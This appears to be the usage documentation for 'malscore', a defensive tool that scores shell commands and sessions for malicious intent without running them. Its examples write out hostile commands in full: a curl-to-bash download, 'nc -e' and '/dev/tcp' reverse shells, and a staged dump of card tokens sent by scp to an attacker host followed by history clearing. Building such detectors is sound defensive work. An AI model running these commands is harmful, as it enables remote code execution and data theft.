# Usage

`malscore` is both a command-line tool and a small Python library. It has no
dependencies beyond the standard library and never executes what it analyses.

## Command line

```
malscore [options] [command ...]
```

### Input modes

A command can be given three ways; pick exactly one of these or `--batch`:

```bash
# 1. as arguments
malscore "curl -s http://45.33.2.1/x.sh | bash"

# 2. from stdin (use the '-' sentinel, or just pipe)
echo "nc -e /bin/sh 10.0.0.1 4444" | malscore -

# 3. a session: one command per line (a shell history, say)
malscore --session history.txt
history | cut -c8- | malscore --session -
```

A **session** scores each command on its own and then looks for cross-command
patterns — data staged then exfiltrated, a download run later, privilege
escalation followed by credential access, activity followed by history/log
clearing. Every non-blank line is treated as one literal command; there is no
parsing of comments, line continuations or here-documents.

`--batch FILE` scores every command in a JSON Lines or JSON-array event feed
**independently** (no cross-command analysis). Each record's command is read from
any of `cmdline`, `command`, `cmd`, `command_line`, `proctitle`, … and may be a
string or an argv list. `user` and `timestamp` fields are echoed through. A
`.gz` feed is decompressed; `-` reads stdin.

```bash
malscore --batch events.jsonl --min-verdict high        # only high/critical
malscore --batch events.jsonl.gz --json                 # one JSON object per line
```

### Options

| option | effect |
| --- | --- |
| `-s, --session FILE` | score a session, one command per line (`-` = stdin) |
| `--batch FILE` | score each command in a JSONL/array feed independently (`-` = stdin) |
| `-j, --json` | emit JSON instead of the coloured text report |
| `-e, --explain` | list every signal that fired, with weight and techniques |
| `--redact` | redact credential-looking values before any command text is echoed |
| `--min-verdict BAND` | in `--batch`, only print events at or above this band |
| `--fail-on BAND` | exit non-zero when the verdict reaches this band |
| `--no-color` | disable ANSI colour |

Bands are `benign`, `low`, `medium`, `high`, `critical`.

### Exit codes

| code | meaning |
| --- | --- |
| `0` | success (and, with `--fail-on`, the verdict was below the threshold) |
| `2` | with `--fail-on BAND`, the verdict was at or above `BAND` |

This makes `malscore` usable as a gate:

```bash
# fail a pipeline step on a high or critical command
malscore --session deploy_session.txt --fail-on high
```

### Examples

```bash
# full evidence with MITRE technique ids
malscore "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" --explain

# redact the password before the command is printed back
malscore --redact "mysql --password=hunter2 -h db -e 'select 1'"
```

## Python API

```python
from malscore import Analyzer

a = Analyzer()

# one command
r = a.assess_command("curl -s http://1.2.3.4/x.sh | bash")
print(r.score, r.verdict)                 # 67 high
print([h.id for h in r.hits])             # ['download_pipe_interpreter', ...]
print(r.techniques)                       # ['T1059.004', 'T1105', ...]

# a session (list of commands, scored together)
s = a.assess_session([
    "pg_dump -t customer.card_token ledger > /tmp/cust.dump",
    "gzip /tmp/cust.dump",
    "scp /tmp/cust.dump.gz attacker@45.33.2.1:/loot/",
    "history -c",
])
print(s.score, s.verdict)                 # critical
print([c.score for c in s.per_command])   # each command's own score
```

`Analyzer(redact=True)` redacts credential-looking values in every command echoed
back in the result; it never changes the score.

### The `Assessment` object

`assess_command` and `assess_session` both return an `Assessment`:

| attribute | meaning |
| --- | --- |
| `score` | integer 0–100 |
| `verdict` | one of the five bands |
| `hits` | the `Signal` objects that fired, strongest first |
| `tactics` | distinct MITRE tactics seen, in order |
| `techniques` | distinct MITRE technique ids seen |
| `command` | the (optionally redacted) command text; empty for a session |
| `line` | 1-based position of the command in a session, else 0 |
| `per_command` | for a session, the per-command `Assessment` list |

`Assessment.as_dict()` returns a JSON-ready dict (the same shape the CLI emits
with `--json`); pass `include_commands=False` to omit the per-command breakdown.

Each `Signal` in `hits` exposes `id`, `title`, `weight`, `tactic` and
`techniques`. See the [signal reference](signals.md) for the full catalogue.
